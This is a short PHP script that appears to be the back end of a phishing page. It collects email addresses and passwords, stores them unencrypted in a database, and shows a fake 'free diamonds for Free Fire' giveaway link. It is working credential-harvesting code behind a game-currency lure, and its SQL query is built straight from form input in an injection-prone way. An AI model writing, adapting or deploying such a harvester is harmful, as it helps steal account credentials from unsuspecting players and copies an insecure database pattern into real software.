<?php


if (isset($_POST['email']) && isset($_POST['password'])) {
    include 'db_conn.php';

    function validate($data)
    {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }

    $email = validate($_POST['email']);
    $password = validate($_POST['password']);

    if (empty($password) || empty($email)) {
        header("Location: index.html");
    } else {

        $sql = "INSERT INTO test(email, password) VALUES('$email', '$password')";
        $res = mysqli_query($conn, $sql);

        if ($res) {
            echo '>> .Free DIAMOND FOR FREE FIRE WITH THE ID. >>>  <a href="Diamond send.html"> CLICK >>Diamond For Free Fire</a>';
        } else {
            echo "لقد انتها العرض ";
        }
    }
} else {
    header("Location: index.html");
}
